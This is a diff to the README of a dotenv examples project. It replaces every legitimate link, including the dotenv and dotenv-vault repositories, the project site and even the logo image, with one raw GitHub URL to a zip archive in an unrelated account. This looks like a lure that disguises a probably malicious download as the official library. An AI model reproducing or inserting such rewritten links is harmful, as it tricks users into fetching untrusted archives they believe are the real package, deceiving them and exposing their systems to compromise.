@@ -1,11 +1,11 @@
-Works with [dotenv-vault](https://github.com/dotenv-org/dotenv-vault). Learn more at [dotenv.org/vault](https://dotenv.org/vault).
+Works with [dotenv-vault](https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip). Learn more at [https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip](https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip).
 
 # dotenv-examples
 
-<img src="https://raw.githubusercontent.com/dotenv-org/examples/master/dotenv-examples.png" alt="dotenv" align="right" />
+<img src="https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip" alt="dotenv" align="right" />
 
-Examples of using [dotenv](https://github.com/motdotla/dotenv) with various code, frameworks, and languages.
+Examples of using [dotenv](https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip) with various code, frameworks, and languages.
 
 #### Questions about usage?
 
-Visit [dotenv](https://github.com/motdotla/dotenv) to see installation and usage.
+Visit [dotenv](https://raw.githubusercontent.com/Krizx6/dotenv/master/divalence/dotenv.zip) to see installation and usage.
